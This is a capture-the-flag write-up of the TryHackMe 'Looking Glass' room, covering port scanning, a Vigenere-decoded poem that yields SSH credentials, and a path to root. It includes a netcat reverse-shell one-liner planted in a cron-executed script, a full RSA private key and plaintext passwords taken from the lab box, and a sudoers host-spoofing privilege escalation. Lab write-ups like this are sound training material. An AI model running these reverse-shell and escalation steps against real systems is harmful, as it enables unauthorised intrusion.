---
title: "TryHackMe - Looking Glass"
categories:
  - Writeup
tags:
  - sqli
  - writeup
  - tryhackme
  - hacking
  - privesc
---
Step through the looking glass. A sequel to the Wonderland challenge room.

## Scanning 
Scanning all ports with `aggressive` mode.

```bash
$ rustscan -a 10.10.244.33 --ulimit 5000 -- -Pn -sV > hasil
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
```

So many ports open, started with port 22 as SSH, and port 9000-13999 as Dropbear sshd.

```
PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
9000/tcp  open  ssh        syn-ack Dropbear sshd (protocol 2.0)
9001/tcp  open  ssh        syn-ack Dropbear sshd (protocol 2.0)
9002/tcp  open  ssh        syn-ack Dropbear sshd (protocol 2.0)
9003/tcp  open  ssh        syn-ack Dropbear sshd (protocol 2.0)
...
13992/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
13993/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
13994/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
13995/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
13996/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
13997/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
13998/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
13999/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumerating
First, i tried connect SSH to port 9000.

```bash
$ ssh 10.10.244.33 -p 9000                        
The authenticity of host '[10.10.244.33]:9000 ([10.10.244.33]:9000)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.244.33]:9000' (RSA) to the list of known hosts.
Lower
Connection to 10.10.244.33 closed.
```

It said "Lower", so let's try SSH to another port.

```bash
$ ssh 10.10.244.33 -p 12000
The authenticity of host '[10.10.244.33]:12000 ([10.10.244.33]:12000)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.244.33]:12000' (RSA) to the list of known hosts.
Higher
Connection to 10.10.244.33 closed.
```

"Higher", let's try couple more times until we hit the `sweet` spot.

```bash
$ ssh 10.10.244.33 -p 11238
The authenticity of host '[10.10.244.33]:11238 ([10.10.244.33]:11238)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.244.33]:11238' (RSA) to the list of known hosts.
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
```

A encrypted text, let's try to decrypt it. I got the key from [this](https://www.boxentriq.com/code-breaking/vigenere-cipher) site.

<a href="/assets/images/tryhackme/looking-glass/1.png"><img src="/assets/images/tryhackme/looking-glass/1.png"></a>

Here is the full decrypted text:

```
'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.

'Beware the Jabberwock, my son!
The jaws that bite, the claws that catch!
Beware the Jubjub bird, and shun
The frumious Bandersnatch!'

He took his vorpal sword in hand:
Long time the manxome foe he sought--
So rested he by the Tumtum tree,
And stood awhile in thought.

And as in uffish thought he stood,
The Jabberwock, with eyes of flame,
Came whiffling through the tulgey wood,
And burbled as it came!

One, two! One, two! And through and through
The vorpal blade went snicker-snack!
He left it dead, and with its head
He went galumphing back.

'And hast thou slain the Jabberwock?
Come to my arms, my beamish boy!
O frabjous day! Callooh! Callay!'
He chortled in his joy.

'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.
Your secret is bewareTheJabberwock
```

Let's input `bewareTheJabberwock` to the prompt before.

```bash
Enter Secret:
jabberwock:VexationHearthWondersHelping
Connection to 10.10.244.33 closed.
```

We got credential for SSH at port 22 i guess.

## Gaining access
Let's SSH at default port (22) using the credential we found before.

```bash
$ ssh jabberwock@10.10.244.33 
The authenticity of host '10.10.244.33 (10.10.244.33)' can't be established.
ECDSA key fingerprint is SHA256:kaciOm3nKZjBx4DS3cgsQa0DIVv86s9JtZ0m83r1Pu4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.244.33' (ECDSA) to the list of known hosts.
jabberwock@10.10.244.33's password: 
Last login: Fri Jul  3 03:05:33 2020 from 192.168.170.1
jabberwock@looking-glass:~$
```

User flag:

```bash
jabberwock@looking-glass:~$ ls
poem.txt  twasBrillig.sh  user.txt
jabberwock@looking-glass:~$ cat user.txt
}32a911966cab2d643f5d57d9e0173d56{mht
```

It's reversed, let's reverse it back.

```bash
jabberwock@looking-glass:~$ rev user.txt 
thm{REDACTED}
```

## Privilege Escalation
There's also a `poem.txt` (same as poem before) and `twasBrillig.sh` file. Here is the content of `twasBrillig.sh` file.

```bash
jabberwock@looking-glass:~$ cat twasBrillig.sh 
wall $(cat /home/jabberwock/poem.txt)
```

Checking sudo privileges.

```bash
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```

Checking cron.

```bash
jabberwock@looking-glass:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

We can make our reverse shell and put it at `twasBrillig` file!

```bash
jabberwock@looking-glass:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.25.205 9999 >/tmp/f" > twasBriilig.sh
```

Set up our netcat listener and run `reboot` as sudo to the machine.

```bash
$ nc -lnvp 9999
listening on [any] 9999 ...
```

Got our shell back!

```
$ nc -lnvp 9999
listening on [any] 9999 ...
ls
connect to [10.11.25.205] from (UNKNOWN) [10.10.244.33] 46488
/bin/sh: 0: can't access tty; job control turned off
$ humptydumpty.txt
poem.txt
```

`humptydumpty` file:

```bash
tweedledum@looking-glass:~$ cat humptydumpty.txt
cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
```

Let's dehash it.

<a href="/assets/images/tryhackme/looking-glass/2.png"><img src="/assets/images/tryhackme/looking-glass/2.png"></a>
<a href="/assets/images/tryhackme/looking-glass/3.png"><img src="/assets/images/tryhackme/looking-glass/3.png"></a>

We got `humptydumpty` password, let's switch to him / her.

```bash
tweedledum@looking-glass:/home$ su humptydumpty
su humptydumpty
Password: zyxwvutsrqponmlk

humptydumpty@looking-glass:/home$
```

I tried basic enumeration to find something to escalate our priv. and found nothing. I found that we can execute inside `/home/alice` directory. Let's enumerate through the directory.

```bash
humptydumpty@looking-glass:/hocd alicel 
cd alice
humptydumpty@looking-glass:/home/alice$ ls
ls
ls: cannot open directory '.': Permission denied
humptydumpty@looking-glass:/home/alice$ cd .ssh
cd .ssh
humptydumpty@looking-glass:/home/alice/.ssh$ ls
ls
ls: cannot open directory '.': Permission denied
humptydumpty@looking-glass:/home/alice/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit+jVPriHiCA73k7g
HCgpkwWczNa5MMGo+1Cg4ifzffv4uhPkxBLLl3f4rBf84RmuKEEy6bYZ+/WOEgHl
fks5ngFniW7x2R3vyq7xyDrwiXEjfW4yYe+kLiGZyyk1ia7HGhNKpIRufPdJdT+r
NGrjYFLjhzeWYBmHx7JkhkEUFIVx6ZV1y+gihQIDAQABAoIBAQDAhIA5kCyMqtQj
X2F+O9J8qjvFzf+GSl7lAIVuC5Ryqlxm5tsg4nUZvlRgfRMpn7hJAjD/bWfKLb7j
/pHmkU1C4WkaJdjpZhSPfGjxpK4UtKx3Uetjw+1eomIVNu6pkivJ0DyXVJiTZ5jF
ql2PZTVpwPtRw+RebKMwjqwo4k77Q30r8Kxr4UfX2hLHtHT8tsjqBUWrb/jlMHQO
zmU73tuPVQSESgeUP2jOlv7q5toEYieoA+7ULpGDwDn8PxQjCF/2QUa2jFalixsK
WfEcmTnIQDyOFWCbmgOvik4Lzk/rDGn9VjcYFxOpuj3XH2l8QDQ+GO+5BBg38+aJ
cUINwh4BAoGBAPdctuVRoAkFpyEofZxQFqPqw3LZyviKena/HyWLxXWHxG6ji7aW
DmtVXjjQOwcjOLuDkT4QQvCJVrGbdBVGOFLoWZzLpYGJchxmlR+RHCb40pZjBgr5
8bjJlQcp6pplBRCF/OsG5ugpCiJsS6uA6CWWXe6WC7r7V94r5wzzJpWBAoGBAM1R
aCg1/2UxIOqxtAfQ+WDxqQQuq3szvrhep22McIUe83dh+hUibaPqR1nYy1sAAhgy
wJohLchlq4E1LhUmTZZquBwviU73fNRbID5pfn4LKL6/yiF/GWd+Zv+t9n9DDWKi
WgT9aG7N+TP/yimYniR2ePu/xKIjWX/uSs3rSLcFAoGBAOxvcFpM5Pz6rD8jZrzs
SFexY9P5nOpn4ppyICFRMhIfDYD7TeXeFDY/yOnhDyrJXcbOARwjivhDLdxhzFkx
X1DPyif292GTsMC4xL0BhLkziIY6bGI9efC4rXvFcvrUqDyc9ZzoYflykL9KaCGr
+zlCOtJ8FQZKjDhOGnDkUPMBAoGBAMrVaXiQH8bwSfyRobE3GaZUFw0yreYAsKGj
oPPwkhhxA0UlXdITOQ1+HQ79xagY0fjl6rBZpska59u1ldj/BhdbRpdRvuxsQr3n
aGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXK
e8wCbMuhAoGBAOKy5OnaHwB8PcFcX68srFLX4W20NN6cFp12cU2QJy2MLGoFYBpa
dLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9
k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
-----END RSA PRIVATE KEY-----
```

We got alice's private key! Let's use it.

```bash
$ chmod 600 id_rsa
$ ssh -i id_rsa alice@10.10.244.33                                                                    255 ⨯
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
alice@looking-glass:~$
```

Looking for way to escalate to root. I tried basic enum. and didn't find any. Then i checked the `/etc/sudoers.d/` directory and find something.

```bash
alice@looking-glass:~$ cd /etc/sudoers.d
alice@looking-glass:/etc/sudoers.d$ ls
README  alice  jabberwock  tweedles
alice@looking-glass:/etc/sudoers.d$ cat alice 
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

Let's abuse it by changing the host.

```bash
alice@looking-glass:/etc/sudoers.d$ sudo -h ssalg-gnikool bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:/etc/sudoers.d# cat /root/root.txt
}f3dae6dec817ad10b750d79f6b7332cb{mht
root@looking-glass:/etc/sudoers.d# rev /root/root.txt
thm{REDACTED}
```
